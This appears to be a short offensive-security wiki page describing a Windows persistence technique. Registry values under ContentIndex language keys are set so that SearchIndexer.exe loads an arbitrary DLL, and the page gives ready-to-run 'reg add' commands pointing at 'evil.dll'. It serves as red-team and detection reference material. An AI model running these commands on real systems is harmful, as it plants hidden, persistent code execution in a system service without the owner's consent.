# Natural Language 6 DLLs

## Theory

Under any of the languages in the Natural Language Development Platform 6 library (NaturalLanguage6.dll) registry keys, we can set the value of either `StemmerDLLPathOverride` or `WBDLLPathOverride` to the location of our malicious DLL. The DLL will be loaded via LoadLibrary executed by SearchIndexer.exe.

## Practice

{% tabs %}
{% tab title="Natural Language 6 DLLs" %}
You can force SearchIndexer.exe to load some DLLs specified in this registry:

* `HKLM\System\CurrentControlSet\Control\ContentIndex\Language\<some language>\StemmerDLLPathOverride`
* `HKLM\System\CurrentControlSet\Control\ContentIndex\Language\<some language>\WBDLLPathOverride`

```powershell
# StemmerDLLPathOverride
reg add "HKLM\System\CurrentControlSet\Control\ContentIndex\Language\English_US" /v StemmerDLLPathOverride /t REG_SZ /d "C:\Users\root\evil.dll"

# WBDLLPathOverride
reg add "HKLM\System\CurrentControlSet\Control\ContentIndex\Language\English_US" /v WBDLLPathOverride /t REG_SZ /d "C:\Users\root\evil.dll"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.hexacorn.com/blog/2018/12/30/beyond-good-ol-run-key-part-98/" %}
